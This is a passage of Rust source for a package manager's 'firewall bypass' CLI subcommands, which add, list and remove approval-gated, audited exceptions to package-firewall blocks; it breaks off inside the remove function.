//! `lpm firewall bypass`: exceptions that let specific package versions past
//! LPM Firewall blocks without turning the firewall off.

use crate::firewall_bypass::{
    AddedVerdict, BlockClass, BypassKind, FirewallBypassRule, FirewallBypassScope,
    FirewallBypassSpec, MAX_SPECS_PER_APPROVAL, bypass_add_command_with,
    forced_floor_refuses_additions, project_policy_root_text, rule_json,
    shell_safe_in_double_quotes, spec_shell_safe, visible_root,
};
use crate::install_ui;
use crate::security_approval;
use clap::Subcommand;
use lpm_common::{LpmError, Timestamp};
use lpm_registry::RegistryClient;
use lpm_registry::client::{
    AuthPosture, NpmFirewallAction, NpmFirewallBatchPackage, NpmFirewallDecision,
};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

const BYPASS_SCHEMA_VERSION: u32 = 1;

#[derive(Debug, Subcommand)]
pub enum FirewallCmd {
    /// Let specific package versions past LPM Firewall blocks, without
    /// turning the firewall off.
    Bypass {
        #[command(subcommand)]
        action: BypassCmd,
    },
}

#[derive(Debug, Subcommand)]
pub enum BypassCmd {
    /// Allow package versions that LPM Firewall blocks. Asks for Touch ID,
    /// Windows Hello, or your password.
    ///
    /// A spec is `name` (every version), `name@1.2.3`, or `name@<range>`
    /// such as `react@^18.19.0`. Name and range rules never cover malware or
    /// unscanned versions; an exact version covers malware only with
    /// `--allow-malware`.
    Add {
        #[arg(required = true, value_name = "SPEC")]
        specs: Vec<String>,

        /// Apply only in this project (the current one when no path is given)
        /// instead of in every project.
        #[arg(long, value_name = "PATH", num_args = 0..=1, default_missing_value = ".")]
        project: Option<PathBuf>,

        /// Stop applying the rule after this long (`30m`, `12h`, `30d`).
        #[arg(long, value_name = "DURATION")]
        ttl: Option<String>,

        /// A note `lpm firewall bypass list` shows with the rule.
        #[arg(long, value_name = "TEXT")]
        reason: Option<String>,

        /// Also allow an exact version that LPM Firewall flags as malware.
        #[arg(long)]
        allow_malware: bool,
    },

    /// Show bypass rules.
    #[command(visible_alias = "ls")]
    List {
        /// Only rules for this project (the current one when no path is given).
        #[arg(
            long,
            value_name = "PATH",
            num_args = 0..=1,
            default_missing_value = ".",
            conflicts_with = "global"
        )]
        project: Option<PathBuf>,

        /// Only rules for every project.
        #[arg(long)]
        global: bool,
    },

    /// Remove bypass rules by spec or id. Needs no approval.
    #[command(visible_alias = "rm")]
    Remove {
        #[arg(required = true, value_name = "SPEC_OR_ID")]
        targets: Vec<String>,

        /// Remove this project's rule (the current one when no path is given)
        /// instead of the rule for every project.
        #[arg(long, value_name = "PATH", num_args = 0..=1, default_missing_value = ".")]
        project: Option<PathBuf>,
    },

    /// Remove every bypass rule, or only the global or one project's. Needs
    /// no approval.
    Clear {
        /// Only this project's rules (the current one when no path is given).
        #[arg(
            long,
            value_name = "PATH",
            num_args = 0..=1,
            default_missing_value = ".",
            conflicts_with = "global"
        )]
        project: Option<PathBuf>,

        /// Only the rules for every project.
        #[arg(long)]
        global: bool,
    },
}

pub async fn run(
    cmd: &FirewallCmd,
    client: &RegistryClient,
    cwd: &Path,
    json_output: bool,
) -> Result<(), LpmError> {
    let FirewallCmd::Bypass { action } = cmd;
    match action {
        BypassCmd::Add {
            specs,
            project,
            ttl,
            reason,
            allow_malware,
        } => {
            let request = AddRequest {
                specs,
                project: project.as_deref(),
                ttl: ttl.as_deref(),
                reason: reason.as_deref(),
                allow_malware: *allow_malware,
            };
            add(client, cwd, &request, json_output).await
        }
        BypassCmd::List { project, global } => list(cwd, project.as_deref(), *global, json_output),
        BypassCmd::Remove { targets, project } => {
            remove(cwd, targets, project.as_deref(), json_output)
        }
        BypassCmd::Clear { project, global } => {
            clear(cwd, project.as_deref(), *global, json_output)
        }
    }
}

struct AddRequest<'a> {
    specs: &'a [String],
    project: Option<&'a Path>,
    ttl: Option<&'a str>,
    reason: Option<&'a str>,
    allow_malware: bool,
}

/// Where a rule applies: every project, or one project root.
struct RuleScope {
    scope: FirewallBypassScope,
    project_root: Option<String>,
}

impl RuleScope {
    fn resolve(cwd: &Path, project: Option<&Path>) -> Result<Self, LpmError> {
        match project {
            None => Ok(Self {
                scope: FirewallBypassScope::Global,
                project_root: None,
            }),
            Some(path) => Ok(Self {
                scope: FirewallBypassScope::Project,
                project_root: Some(project_policy_root_text(&cwd.join(path))?),
            }),
        }
    }

    fn holds(&self, rule: &FirewallBypassRule) -> bool {
        rule.scope == self.scope && rule.project_root == self.project_root
    }

    fn describe(&self) -> String {
        match &self.project_root {
            None => "in every project".to_string(),
            // Quoted, so a root ending in ` now` or a period reads whole in
            // the macOS dialog, which trims those from the end of its text.
            Some(root) => format!("in the project at \"{}\"", visible_root(root)),
        }
    }
}

fn parse_specs(raw_specs: &[String]) -> Result<Vec<FirewallBypassSpec>, LpmError> {
    let mut specs: Vec<FirewallBypassSpec> = Vec::with_capacity(raw_specs.len());
    for raw in raw_specs {
        let spec = FirewallBypassSpec::parse(raw).map_err(|error| {
            LpmError::InvalidPackageName(format!(
                "`{}`: {error}",
                lpm_common::sanitize_server_text(raw, 120)
            ))
        })?;
        if !specs
            .iter()
            .any(|existing| existing.to_string() == spec.to_string())
        {
            specs.push(spec);
        }
    }
    Ok(specs)
}

/// The verdict LPM Firewall gives an exact version right now, as `add`
/// shows it before asking for approval.
enum Preview {
    Blocked(Box<NpmFirewallDecision>),
    NotBlocked,
    Unavailable(String),
}

async fn preview_exact_specs(
    client: &RegistryClient,
    specs: &[&FirewallBypassSpec],
    profile: lpm_registry::client::NpmFirewallPolicyProfile,
) -> HashMap<String, Preview> {
    let packages: Vec<NpmFirewallBatchPackage> = specs
        .iter()
        .filter(|spec| spec.kind() == BypassKind::Exact)
        .filter_map(|spec| {
            Some(NpmFirewallBatchPackage {
                name: spec.name().to_string(),
                version: spec.version_text()?,
                integrity: None,
                published_at: None,
            })
        })
        .collect();
    let mut previews = HashMap::with_capacity(packages.len());
    if packages.is_empty() {
        return previews;
    }
    match client
        .npm_firewall_batch_verdicts_with_posture_and_policy(
            &packages,
            AuthPosture::AuthRequired,
            Some(profile),
        )
        .await
    {
        Ok(response) => {
            // As installs count them: a block row for a version this preview
            // didn't ask about, or a second row for one it did, names nothing
            // and leaves every unblocked answer unconfirmed.
            let requested: std::collections::HashSet<(&str, &str)> = packages
                .iter()
                .map(|package| (package.name.as_str(), package.version.as_str()))
                .collect();
            let summary_blocks = response.summary.block;
            let mut block_rows: u64 = 0;
            let mut blocked: HashMap<(String, String), NpmFirewallDecision> =
                HashMap::with_capacity(packages.len());
            for decision in response.decisions {
                if decision.action != NpmFirewallAction::Block {
                    continue;
                }
                block_rows += 1;
                if !requested.contains(&(decision.name.as_str(), decision.version.as_str())) {
                    continue;
                }
                let key = (decision.name.clone(), decision.version.clone());
                match blocked.entry(key) {
                    std::collections::hash_map::Entry::Vacant(slot) => {
                        slot.insert(decision);
                    }
                    std::collections::hash_map::Entry::Occupied(mut slot) => {
                        if block_class_of(&decision).lift_difficulty()
                            > block_class_of(slot.get()).lift_difficulty()
                        {
                            slot.insert(decision);
                        }
                    }
                }
            }
            let unnamed_blocks = summary_blocks.max(block_rows) > blocked.len() as u64;
            for package in packages {
                let key = (package.name, package.version);
                let preview = match blocked.remove(&key) {
                    Some(decision) => Preview::Blocked(Box::new(decision)),
                    None if unnamed_blocks => Preview::Unavailable(
                        "LPM Firewall counted a block without naming the version".to_string(),
                    ),
                    None => Preview::NotBlocked,
                };
                previews.insert(format!("{}@{}", key.0, key.1), preview);
            }
        }
        Err(error) => {
            let reason = lpm_common::sanitize_server_text(&error.to_string(), 200);
            for package in packages {
                previews.insert(
                    format!("{}@{}", package.name, package.version),
                    Preview::Unavailable(reason.clone()),
                );
            }
        }
    }
    previews
}

fn block_class_of(decision: &NpmFirewallDecision) -> BlockClass {
    BlockClass::of(
        &decision.verdict,
        decision.policy.as_ref().map(|policy| policy.group.as_str()),
    )
}

/// Refuses a spec whose current block its rule could not lift, and
/// `--allow-malware` for anything but a version LPM Firewall currently
/// blocks as malware.
fn check_previews(
    specs: &[&FirewallBypassSpec],
    previews: &HashMap<String, Preview>,
    allow_malware: bool,
) -> Result<(), LpmError> {
    for spec in specs {
        let coordinate = spec.to_string();
        let preview = previews.get(&coordinate);
        let class = match preview {
            Some(Preview::Blocked(decision)) => Some(block_class_of(decision)),
            _ => None,
        };
        if class == Some(BlockClass::ServerReview) {
            return Err(LpmError::SecurityFloor(format!(
                "{coordinate} is held for LPM review, which a local rule can't lift"
            )));
        }
        if class == Some(BlockClass::Malware) && !allow_malware {
            return Err(LpmError::SecurityFloor(format!(
                "LPM Firewall blocks {coordinate} as malware; a rule covers that only when added with `--allow-malware`"
            )));
        }
        if allow_malware && class != Some(BlockClass::Malware) {
            return Err(LpmError::SecurityFloor(match preview {
                Some(Preview::Unavailable(reason)) => format!(
                    "couldn't check the current verdict for {coordinate} ({reason}); `--allow-malware` needs LPM Firewall to report the malware verdict first"
                ),
                _ => format!(
                    "LPM Firewall doesn't block {coordinate} as malware; run the command without `--allow-malware`"
                ),
            }));
        }
    }
    Ok(())
}

fn added_verdict(preview: Option<&Preview>) -> Option<AddedVerdict> {
    let Some(Preview::Blocked(decision)) = preview else {
        return None;
    };
    Some(AddedVerdict {
        verdict: decision.verdict.clone(),
        block_class: block_class_of(decision).as_str().to_string(),
        policy_group: decision.policy.as_ref().map(|policy| policy.group.clone()),
        report_url: decision
            .display
            .as_ref()
            .and_then(|display| display.report_url.clone()),
    })
}

/// The requested specs, in the order given, that `rules` name.
fn specs_named_by<'a, 'r>(
    specs: &'a [FirewallBypassSpec],
    rules: impl IntoIterator<Item = &'r FirewallBypassRule>,
) -> Vec<&'a FirewallBypassSpec> {
    let named: std::collections::HashSet<&str> =
        rules.into_iter().map(|rule| rule.spec.as_str()).collect();
    specs
        .iter()
        .filter(|spec| named.contains(spec.to_string().as_str()))
        .collect()
}

/// The command a person runs to add `specs` in `scope` with the same
/// duration, malware coverage and note, or `None` when a spec or the project
/// root can't be written into a shell command unchanged. A note a shell would
/// expand is left out; the person can add it again.
fn add_command_hint(
    specs: &[&FirewallBypassSpec],
    scope: &RuleScope,
    ttl_secs: Option<u64>,
    allow_malware: bool,
    reason: Option<&str>,
) -> Option<String> {
    let coordinates: Vec<String> = specs.iter().map(ToString::to_string).collect();
    if !coordinates
        .iter()
        .all(|coordinate| spec_shell_safe(coordinate))
    {
        return None;
    }
    let mut options = String::new();
    if let Some(root) = &scope.project_root {
        if !shell_safe_in_double_quotes(root) {
            return None;
        }
        options.push_str(" --project \"");
        options.push_str(root);
        options.push('"');
    }
    if let Some(ttl_secs) = ttl_secs {
        options.push_str(" --ttl ");
        options.push_str(&ttl_argument(ttl_secs));
    }
    if allow_malware {
        options.push_str(" --allow-malware");
    }
    if let Some(reason) = reason.filter(|reason| reason_shell_safe(reason)) {
        // One quoted word: `=` keeps a note starting with `-` the value, and
        // PowerShell only reads quotes that open a word.
        options.push_str(" \"--reason=");
        options.push_str(reason);
        options.push('"');
    }
    Some(bypass_add_command_with(
        &options,
        coordinates.iter().map(String::as_str),
    ))
}

/// Whether a note reads the same in double quotes in every shell: free text,
/// so it is held to a deny list rather than the paths' allow list. PowerShell
/// also reads the typographic double quotes U+201C to U+201E as quotes.
fn reason_shell_safe(reason: &str) -> bool {
    !reason.chars().any(|character| {
        matches!(
            character,
            '"' | '$' | '`' | '\\' | '!' | '%' | '\u{201C}'..='\u{201F}'
        ) || lpm_common::is_terminal_control(character)
    })
}

/// `ttl_secs` as `--ttl` reads it back: whole days, hours or minutes, else
/// bare seconds.
fn ttl_argument(ttl_secs: u64) -> String {
    for (unit_secs, suffix) in [(86_400, 'd'), (3_600, 'h'), (60, 'm')] {
        if ttl_secs.is_multiple_of(unit_secs) {
            return format!("{}{suffix}", ttl_secs / unit_secs);
        }
    }
    ttl_secs.to_string()
}

/// The native prompt: what is allowed, where, and for how long. Built only
/// from validated specs and fixed text.
fn approval_prompt(
    specs: &[&FirewallBypassSpec],
    scope: &RuleScope,
    ttl_secs: Option<u64>,
    allow_malware: bool,
) -> String {
    let mut prompt = match specs {
        [spec] => format!("Allow {}", spec.describe()),
        _ => format!("Allow {} packages", specs.len()),
    };
    if allow_malware {
        prompt.push_str(", including a malware verdict,");
    }
    prompt.push_str(" past LPM Firewall ");
    prompt.push_str(&scope.describe());
    if let Some(ttl_secs) = ttl_secs {
        prompt.push_str(" for ");
        prompt.push_str(&security_approval::format_unlock_duration(ttl_secs));
    }
    if specs.len() > 1 {
        prompt.push_str(": ");
        prompt.push_str(
            &specs
                .iter()
                .map(|spec| spec.describe())
                .collect::<Vec<_>>()
                .join(", "),
        );
    }
    prompt
}

/// How many times `add` commits a request again when rules change under it.
const MAX_ADD_ATTEMPTS: usize = 3;

/// The longest prompt one approval shows; longer requests ask more than once.
const MAX_APPROVAL_PROMPT_CHARS: usize = 320;

/// `specs` split into approvals of at most [`MAX_SPECS_PER_APPROVAL`] specs
/// whose prompt stays within [`MAX_APPROVAL_PROMPT_CHARS`], so each prompt
/// names everything it approves in full. A spec too long to share a prompt
/// gets one of its own.
fn approval_batches<'a>(
    specs: &[&'a FirewallBypassSpec],
    prompt_for: impl Fn(&[&FirewallBypassSpec]) -> String,
) -> Vec<Vec<&'a FirewallBypassSpec>> {
    let mut batches: Vec<Vec<&FirewallBypassSpec>> = Vec::new();
    let mut current: Vec<&FirewallBypassSpec> = Vec::with_capacity(MAX_SPECS_PER_APPROVAL);
    for spec in specs {
        current.push(spec);
        if current.len() > 1
            && (current.len() > MAX_SPECS_PER_APPROVAL
                || prompt_for(&current).chars().count() > MAX_APPROVAL_PROMPT_CHARS)
        {
            current.pop();
            batches.push(std::mem::replace(
                &mut current,
                Vec::with_capacity(MAX_SPECS_PER_APPROVAL),
            ));
            current.push(spec);
        }
    }
    if !current.is_empty() {
        batches.push(current);
    }
    batches
}

fn print_add_request(
    specs: &[&FirewallBypassSpec],
    previews: &HashMap<String, Preview>,
    scope: &RuleScope,
) {
    install_ui::warn_untrusted(&format!("LPM Firewall bypass {}:", scope.describe()));
    for spec in specs {
        match previews.get(&spec.to_string()) {
            Some(Preview::Blocked(decision)) => {
                crate::commands::install::print_npm_firewall_decisions(&[decision.as_ref()]);
            }
            Some(Preview::NotBlocked) => install_ui::detail_line(install_ui::terminal_line!(
                "  › {} - {}",
                install_ui::field(&spec.to_string()),
                install_ui::dim("not blocked by LPM Firewall right now"),
            )),
            Some(Preview::Unavailable(reason)) => {
                install_ui::detail_line(install_ui::terminal_line!(
                    "  › {} - {}",
                    install_ui::field(&spec.to_string()),
                    install_ui::dim(&format!("current verdict unavailable: {reason}")),
                ));
            }
            None => install_ui::detail_line(install_ui::terminal_line!(
                "  › {} - {}",
                install_ui::field(&spec.describe()),
                install_ui::dim("never covers malware or unscanned versions"),
            )),
        }
    }
}

fn parse_ttl(ttl: Option<&str>) -> Result<Option<u64>, LpmError> {
    let Some(raw) = ttl else {
        return Ok(None);
    };
    let secs = crate::release_age_config::parse_duration(raw).map_err(|_| invalid_ttl(raw))?;
    if secs == 0 {
        return Err(invalid_ttl(raw));
    }
    Ok(Some(secs))
}

/// When a rule added `now` with `ttl_secs` expires. A duration past the
/// timestamp range is refused rather than saved as a rule that never expires.
fn expiry_after(
    now: Timestamp,
    ttl_secs: Option<u64>,
    raw: &str,
) -> Result<Option<Timestamp>, LpmError> {
    let Some(secs) = ttl_secs else {
        return Ok(None);
    };
    i64::try_from(secs)
        .ok()
        .and_then(|secs| now.checked_add(lpm_common::timestamp::Duration::seconds(secs)))
        .map(Some)
        .ok_or_else(|| invalid_ttl(raw))
}

fn invalid_ttl(raw: &str) -> LpmError {
    LpmError::Registry(format!(
        "invalid `--ttl` value `{}`; use a positive duration such as `30m`, `12h` or `30d`",
        lpm_common::sanitize_server_text(raw, 40)
    ))
}

/// Why `add` refused before any prompt.
struct AddRefusal {
    error: LpmError,
    /// The settings `add` checks couldn't be read. Their error can quote the
    /// file, credentials included, so the audit log keeps only its kind.
    settings_unreadable: bool,
}

impl AddRefusal {
    fn settings_unreadable(error: LpmError) -> Self {
        Self {
            error,
            settings_unreadable: true,
        }
    }

    /// What the audit log keeps of the refusal.
    fn audit_detail(&self) -> String {
        if self.settings_unreadable {
            format!(
                "LPM CLI couldn't read the settings `add` checks ({})",
                self.error.error_code()
            )
        } else {
            self.error.to_string()
        }
    }
}

impl From<LpmError> for AddRefusal {
    fn from(error: LpmError) -> Self {
        Self {
            error,
            settings_unreadable: false,
        }
    }
}

/// Refuses before any prompt, and records the refusal in the audit log.
fn refuse_add(
    specs: &[FirewallBypassSpec],
    project_root: Option<&str>,
    refusal: AddRefusal,
) -> LpmError {
    security_approval::record_firewall_bypass_refusal(
        specs.iter().map(ToString::to_string).collect(),
        project_root,
        &refusal.audit_detail(),
    );
    refusal.error
}

/// What `add` settles before any prompt.
struct AddSetup {
    ttl_secs: Option<u64>,
    now: Timestamp,
    global: crate::commands::config::GlobalConfig,
    effective: security_approval::EffectiveAuthorizedPosture,
    sorted: security_approval::FirewallBypassRequests,
}

/// Checks a request whose specs and scope parsed, and sorts its rules by
/// what saving them needs.
fn plan_add(
    request: &AddRequest<'_>,
    specs: &[FirewallBypassSpec],
    scope: &RuleScope,
) -> Result<AddSetup, AddRefusal> {
    if request.allow_malware
        && let Some(spec) = specs.iter().find(|spec| spec.kind() != BypassKind::Exact)
    {
        return Err(LpmError::InvalidPackageName(format!(
            "`--allow-malware` applies only to exact versions such as `name@1.2.3`; `{spec}` names more"
        ))
        .into());
    }
    let ttl_secs = parse_ttl(request.ttl)?;
    let now = Timestamp::now();
    let expires_at = expiry_after(now, ttl_secs, request.ttl.unwrap_or_default())?;
    let global = crate::commands::config::GlobalConfig::load_checked()
        .map_err(AddRefusal::settings_unreadable)?;
    let effective = security_approval::load_effective_authorized_posture()
        .map_err(AddRefusal::settings_unreadable)?;
    refuse_where_additions_are_off(&global, &effective)?;

    let rules: Vec<FirewallBypassRule> = specs
        .iter()
        .map(|spec| {
            let mut rule = FirewallBypassRule::new(
                spec,
                scope.scope,
                scope.project_root.clone(),
                request.allow_malware,
                now,
            );
            rule.expires_at = expires_at;
            rule.reason = request
                .reason
                .map(|reason| lpm_common::sanitize_server_text(reason, 200));
            rule
        })
        .collect();
    let sorted = security_approval::sort_firewall_bypass_requests(rules)?;
    Ok(AddSetup {
        ttl_secs,
        now,
        global,
        effective,
        sorted,
    })
}

async fn add(
    client: &RegistryClient,
    cwd: &Path,
    request: &AddRequest<'_>,
    json_output: bool,
) -> Result<(), LpmError> {
    let specs = parse_specs(request.specs)?;
    let scope = RuleScope::resolve(cwd, request.project)?;
    let AddSetup {
        ttl_secs,
        now,
        global,
        effective,
        sorted,
    } = plan_add(request, &specs, &scope)
        .map_err(|error| refuse_add(&specs, scope.project_root.as_deref(), error))?;
    let outcome = approve_and_save(
        client,
        &PlannedAdd {
            specs: &specs,
            scope: &scope,
            ttl_secs,
            allow_malware: request.allow_malware,
            reason: request.reason,
            json_output,
            preview: (!json_output).then_some((&global, &effective)),
        },
        sorted,
        security_approval::approve_firewall_bypass_rules,
    )
    .await?;

    if json_output {
        let as_json = |rules: &[FirewallBypassRule]| {
            rules
                .iter()
                .map(|rule| rule_json(rule, "local", now))
                .collect::<Vec<_>>()
        };
        print_json(&serde_json::json!({
            "schema_version": BYPASS_SCHEMA_VERSION,
            "success": true,
            "added": as_json(&outcome.added),
            "extended": as_json(&outcome.extended),
            "narrowed": as_json(&outcome.narrowed),
            "unchanged": as_json(&outcome.unchanged),
            "count": outcome.added.len() + outcome.extended.len() + outcome.narrowed.len(),
            "rules_total": outcome.rules_total,
        }));
    } else {
        report_added(&outcome, &scope);
    }
    Ok(())
}

/// A validated `add` request, as [`approve_and_save`] previews, approves
/// and saves it.
struct PlannedAdd<'a> {
    specs: &'a [FirewallBypassSpec],
    scope: &'a RuleScope,
    ttl_secs: Option<u64>,
    allow_malware: bool,
    reason: Option<&'a str>,
    json_output: bool,
    /// The settings the verdict preview reads the policy profile installs
    /// enforce from, read only when a rule needs approval; `None` skips it.
    preview: Option<(
        &'a crate::commands::config::GlobalConfig,
        &'a security_approval::EffectiveAuthorizedPosture,
    )>,
}

/// Previews and approves the rules in `sorted` that add or extend what LPM
/// Firewall lets through, each batch through `approve`, then saves the whole
/// request in one write. Every approval is collected before anything is
/// saved, so a refused or declined `add` changes nothing.
async fn approve_and_save(
    client: &RegistryClient,
    plan: &PlannedAdd<'_>,
    sorted: security_approval::FirewallBypassRequests,
    mut approve: impl FnMut(&security_approval::FirewallBypassApproval<'_>) -> Result<(), LpmError>,
) -> Result<security_approval::FirewallBypassAdded, LpmError> {
    let mut approved_prompts = Vec::new();
    let saved =
        approve_and_save_attempts(client, plan, sorted, &mut approve, &mut approved_prompts).await;
    // One record for a request that saved nothing, whatever ended it: a
    // decline, a refusal, a store error, an expired `--ttl` or rules that
    // kept changing, with what the person approved before it.
    saved.map_err(|refusal| {
        let detail = refusal.audit_detail();
        let detail = if approved_prompts.is_empty() {
            detail
        } else {
            format!("{detail}; approved: {}", approved_prompts.join("; "))
        };
        security_approval::record_firewall_bypass_refusal(
            plan.specs.iter().map(ToString::to_string).collect(),
            plan.scope.project_root.as_deref(),
            &detail,
        );
        refusal.error
    })
}

/// Refuses where a new local rule wouldn't apply or isn't allowed: a managed
/// policy owns the firewall, or `force-security-floor` holds it at enforce.
fn refuse_where_additions_are_off(
    global: &crate::commands::config::GlobalConfig,
    effective: &security_approval::EffectiveAuthorizedPosture,
) -> Result<(), AddRefusal> {
    if let Some(reason) = security_approval::local_firewall_bypass_inactive_reason(effective) {
        return Err(LpmError::SecurityFloor(reason).into());
    }
    if forced_floor_refuses_additions(global, effective).map_err(AddRefusal::settings_unreadable)? {
        return Err(LpmError::SecurityFloor(
            "`force-security-floor = true` keeps the npm firewall at enforce, so new bypass rules are refused; lower the floor intentionally in ~/.lpm/config.toml first".to_string(),
        )
        .into());
    }
    Ok(())
}

/// [`refuse_where_additions_are_off`] with the settings read again, since
/// either can change while a prompt is open: `add` checks before each prompt
/// and, holding the config and store locks, right before it saves.
fn refuse_once_additions_are_off() -> Result<(), AddRefusal> {
    let global = crate::commands::config::GlobalConfig::load_checked()
        .map_err(AddRefusal::settings_unreadable)?;
    let effective = security_approval::load_effective_authorized_posture()
        .map_err(AddRefusal::settings_unreadable)?;
    refuse_where_additions_are_off(&global, &effective)
}

async fn approve_and_save_attempts(
    client: &RegistryClient,
    plan: &PlannedAdd<'_>,
    sorted: security_approval::FirewallBypassRequests,
    approve: &mut impl FnMut(&security_approval::FirewallBypassApproval<'_>) -> Result<(), LpmError>,
    approved_prompts: &mut Vec<String>,
) -> Result<security_approval::FirewallBypassAdded, AddRefusal> {
    let mut pending = sorted.needs_approval;
    let mut narrowing = sorted.narrowed;
    let mut unchanged = sorted.unchanged;
    let mut approved: Vec<FirewallBypassRule> = Vec::with_capacity(pending.len());
    let mut preview_profile = None;
    let prompt_for = |batch: &[&FirewallBypassSpec]| {
        approval_prompt(batch, plan.scope, plan.ttl_secs, plan.allow_malware)
    };
    // The whole request: nothing is saved before every approval is in, and a
    // rule already saved may be removed while a prompt is open, so rerunning
    // all of it is what finishes it.
    let command_hint = add_command_hint(
        &plan.specs.iter().collect::<Vec<_>>(),
        plan.scope,
        plan.ttl_secs,
        plan.allow_malware,
        plan.reason,
    );
    for _ in 0..MAX_ADD_ATTEMPTS {
        if !pending.is_empty() {
            let pending_specs = specs_named_by(plan.specs, &pending);
            if let Some((global, effective)) = plan.preview {
                let profile = match preview_profile {
                    Some(profile) => profile,
                    None => *preview_profile.insert(
                        crate::npm_firewall_config::enforced_policy_profile(global, effective)
                            .map_err(AddRefusal::settings_unreadable)?,
                    ),
                };
                let previews = preview_exact_specs(client, &pending_specs, profile).await;
                check_previews(&pending_specs, &previews, plan.allow_malware)?;
                print_add_request(&pending_specs, &previews, plan.scope);
                for rule in &mut pending {
                    rule.added_verdict = added_verdict(previews.get(&rule.spec));
                }
            }
            for batch in approval_batches(&pending_specs, prompt_for) {
                let prompt = prompt_for(&batch);
                let rules = batch
                    .iter()
                    .filter_map(|spec| {
                        let coordinate = spec.to_string();
                        pending.iter().find(|rule| rule.spec == coordinate).cloned()
                    })
                    .collect();
                refuse_once_additions_are_off()?;
                approve(&security_approval::FirewallBypassApproval {
                    rules,
                    prompt: &prompt,
                    command_hint: command_hint.as_deref(),
                    json_output: plan.json_output,
                })?;
                approved_prompts.push(prompt);
            }
            approved.append(&mut pending);
        }
        let approval_note = format!("approved: {}", approved_prompts.join("; "));
        // The config lock keeps `force-security-floor` and the approved mode
        // from changing between the last check and the write.
        let commit = crate::commands::config::with_config_transaction_lock(|| {
            security_approval::commit_firewall_bypass_rules_if(
                refuse_once_additions_are_off,
                &approved,
                narrowing.iter().chain(&unchanged),
                &approval_note,
            )
        })
        .await?;
        match commit {
            security_approval::FirewallBypassCommit::Saved(outcome) => return Ok(outcome),
            security_approval::FirewallBypassCommit::Expired => {
                return Err(security_approval::bypass_expired_before_save_error(
                    command_hint,
                    plan.scope.project_root.clone(),
                )
                .into());
            }
            // A rule removed, expired or shortened since it was judged a
            // narrowing or already saved now adds or extends one, so it is
            // previewed and approved like any other before the request is
            // saved.
            security_approval::FirewallBypassCommit::NeedsApproval(raced) => {
                let still_held = |rule: &FirewallBypassRule| {
                    !raced.iter().any(|waiting| waiting.is_same_rule_as(rule))
                };
                narrowing.retain(still_held);
                unchanged.retain(still_held);
                pending = raced;
            }
        }
    }
    Err(
        security_approval::rules_kept_changing_error(command_hint, plan.scope.project_root.clone())
            .into(),
    )
}

fn describe_expiry(rule: &FirewallBypassRule) -> String {
    match rule.expires_at {
        Some(expires_at) => format!("{} (until {})", rule.spec, expires_at.to_rfc3339_seconds()),
        None => format!("{} (no expiry)", rule.spec),
    }
}

fn report_added(outcome: &security_approval::FirewallBypassAdded, scope: &RuleScope) {
    let allowed: Vec<String> = outcome
        .added
        .iter()
        .chain(&outcome.extended)
        .map(describe_expiry)
        .collect();
    if !allowed.is_empty() {
        install_ui::done_untrusted(&format!(
            "LPM Firewall now allows {} {}.",
            allowed.join(", "),
            scope.describe()
        ));
    }
    if !outcome.narrowed.is_empty() {
        let rules: Vec<String> = outcome.narrowed.iter().map(describe_expiry).collect();
        install_ui::done_untrusted(&format!(
            "Updated {} {}.",
            rules.join(", "),
            scope.describe()
        ));
    }
    if !outcome.unchanged.is_empty() {
        let rules: Vec<String> = outcome.unchanged.iter().map(describe_expiry).collect();
        install_ui::done_untrusted(&format!(
            "Already allowed {}, unchanged: {}.",
            scope.describe(),
            rules.join(", ")
        ));
    }
}

fn print_json(value: &serde_json::Value) {
    println!(
        "{}",
        serde_json::to_string_pretty(value).expect("JSON values serialize")
    );
}

fn list(
    cwd: &Path,
    project: Option<&Path>,
    global: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    let effective = security_approval::load_effective_authorized_posture()?;
    let inactive_reason = security_approval::local_firewall_bypass_inactive_reason(&effective);
    let filter = match (project, global) {
        (Some(path), _) => Some(RuleScope::resolve(cwd, Some(path))?),
        (None, true) => Some(RuleScope::resolve(cwd, None)?),
        (None, false) => None,
    };
    let mut rules = security_approval::load_local_firewall_bypass_rules()?;
    if let Some(filter) = &filter {
        rules.retain(|rule| filter.holds(rule));
    }
    let now = Timestamp::now();
    let global = crate::commands::config::GlobalConfig::load_checked()?;
    let approved_mode = effective.posture.firewall_mode();
    let firewall_mode = crate::npm_firewall_config::runtime_request_mode(&global)?
        .map_or(approved_mode, |request| {
            request.mode().stricter(approved_mode)
        });

    if json_output {
        print_json(&serde_json::json!({
            "schema_version": BYPASS_SCHEMA_VERSION,
            "success": true,
            "firewall_mode": firewall_mode.as_str(),
            "local_rules_apply": inactive_reason.is_none(),
            "inactive_reason": inactive_reason,
            "rules": rules.iter().map(|rule| rule_json(rule, "local", now)).collect::<Vec<_>>(),
            "managed_rules": effective
                .managed_firewall_bypass
                .iter()
                .map(crate::firewall_bypass::managed_rule_json)
                .collect::<Vec<_>>(),
            "count": rules.len(),
        }));
        return Ok(());
    }

    if rules.is_empty() && effective.managed_firewall_bypass.is_empty() {
        install_ui::done("No LPM Firewall bypass rules.");
        return Ok(());
    }
    if let Some(reason) = &inactive_reason {
        install_ui::warn_untrusted(reason);
    }
    if !rules.is_empty() {
        println!("{}", install_ui::section("firewall bypass rules"));
        let mut table = install_ui::Table::new();
        for rule in &rules {
            let scope = match &rule.project_root {
                Some(root) => install_ui::cyan(root),
                None => install_ui::dim("every project"),
            };
            let mut notes = Vec::with_capacity(3);
            if rule.covers_malware {
                notes.push("includes malware".to_string());
            }
            if let Some(expires_at) = rule.expires_at {
                notes.push(if rule.is_expired(now) {
                    "expired".to_string()
                } else {
                    format!("until {}", expires_at.to_rfc3339_seconds())
                });
            }
            if let Some(reason) = &rule.reason {
                notes.push(reason.clone());
            }
            table.row([
                install_ui::field(&rule.spec),
                scope,
                install_ui::dim(&rule.id),
                install_ui::dim(&notes.join(" · ")),
            ]);
        }
        table.print_stdout();
    }
    if !effective.managed_firewall_bypass.is_empty() {
        println!("{}", install_ui::section("managed firewall bypass rules"));
        let mut table = install_ui::Table::new();
        for rule in &effective.managed_firewall_bypass {
            table.row([
                install_ui::field(&rule.spec),
                install_ui::dim(if rule.covers_malware {
                    "includes malware"
                } else {
                    ""
                }),
            ]);
        }
        table.print_stdout();
    }
    Ok(())
}

fn remove(
    cwd: &Path,
    targets: &[String],
    project: Option<&Path>,
    json_output: bool,
) -> Result<(), LpmError> {
    let scope = RuleScope::resolve(cwd, project)?;
    // A rule id is itself a valid package name, so every target parses as a
    // spec and also matches a rule by id.
    let mut selectors = Vec::with_capacity(targets.len());
    for target in targets {
        let spec = FirewallBypassSpec::parse(target).map_err(|error| {
